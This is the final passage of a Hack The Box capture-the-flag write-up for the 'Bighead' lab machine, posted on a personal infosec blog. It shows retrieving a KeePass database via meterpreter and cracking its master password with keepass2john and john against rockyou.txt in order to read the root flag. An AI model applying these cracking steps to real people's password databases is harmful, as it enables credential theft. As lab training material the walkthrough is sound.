<h4 id="i-wanted-to-test-the-key-we-still-need-the-password-">I wanted to test the key (we still need the password) :</h4>
<p><img src="/images/hackthebox/bighead/149.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/150.png" alt="" /></p>
<h4 id="i-expected-the-composite-key-is-invalid-but-instead-of-that-i-got-the-file-version-is-unsupported-i-tried-many-other-version-of-keepass-and-got-the-same-error-so-i-was-sure-that-the-file-itself-was-corrupted-maybe-because-of-more-i-downloaded-it-again-with-meterpreter-itself-this-time-">I expected <code class="highlighter-rouge">The composite key is invalid</code> but instead of that I got <code class="highlighter-rouge">The file version is unsupported</code>. I tried many other version of <code class="highlighter-rouge">keepass</code> and got the same error. So I was sure that the file itself was corrupted (maybe because of <code class="highlighter-rouge">more</code>). I downloaded it again with <code class="highlighter-rouge">meterpreter</code> itself this time :</h4>
<p><img src="/images/hackthebox/bighead/151.png" alt="" /></p>
<h4 id="then-i-renamed-it-to-dbkdbx-">Then I renamed it to <code class="highlighter-rouge">db.kdbx</code> :</h4>
<p><img src="/images/hackthebox/bighead/152.png" alt="" /></p>
<h4 id="lets-try-again-">Let’s try again :</h4>
<p><img src="/images/hackthebox/bighead/153.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/154.png" alt="" /></p>
<h4 id="perfect--now-we-need-the-password-i-used-keepass2john-to-put-the-kdbx-file-in-a-john-crackable-format-we-need-the-key-to-do-that-adminpng">Perfect ! Now we need the password. I used <code class="highlighter-rouge">keepass2john</code> to put the <code class="highlighter-rouge">kdbx</code> file in a <code class="highlighter-rouge">john</code> crackable format (we need the key to do that (<code class="highlighter-rouge">admin.png</code>))</h4>
<p><code class="highlighter-rouge">keepass2john -k admin.png &gt; db.john</code>
<img src="/images/hackthebox/bighead/155.png" alt="" /></p>
<h4 id="then-i-used-john-with-rockyoutxt-to-crack-it-">Then I used <code class="highlighter-rouge">john</code> with <code class="highlighter-rouge">rockyou.txt</code> to crack it :</h4>
<p><code class="highlighter-rouge">john --wordlist=/usr/share/wordlists/rockyou.txt db.john</code>
<img src="/images/hackthebox/bighead/156.png" alt="" /></p>
<h4 id="the-password-is-darkness-lets-try-to-open-the-database-">The password is <code class="highlighter-rouge">darkness</code>. Let’s try to open the database :</h4>
<p><img src="/images/hackthebox/bighead/157.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/158.png" alt="" /></p>
<h4 id="great--double-click-on-roottxt-and-it-will-copy-the-flag-into-our-clipboard-">Great ! double-click on <code class="highlighter-rouge">root.txt</code> and it will copy the flag into our clipboard :</h4>
<p><img src="/images/hackthebox/bighead/159.png" alt="" /></p>
<h4 id="lets-paste-it-">Let’s paste it :</h4>
<p><img src="/images/hackthebox/bighead/160.png" alt="" /></p>
<h4 id="and-finally-we-can-say--we-owned-root-">And finally we can say … We owned root !</h4>
<p><br />
<br /></p>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-hack-the-box-write-up--hack-the-box---irked">Previous Hack The Box write-up : <a href="/hack-the-box/irked/">Hack The Box - Irked</a></h4>
<h4 id="next-hack-the-box-write-up--hack-the-box---lightweight">Next Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/bighead/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

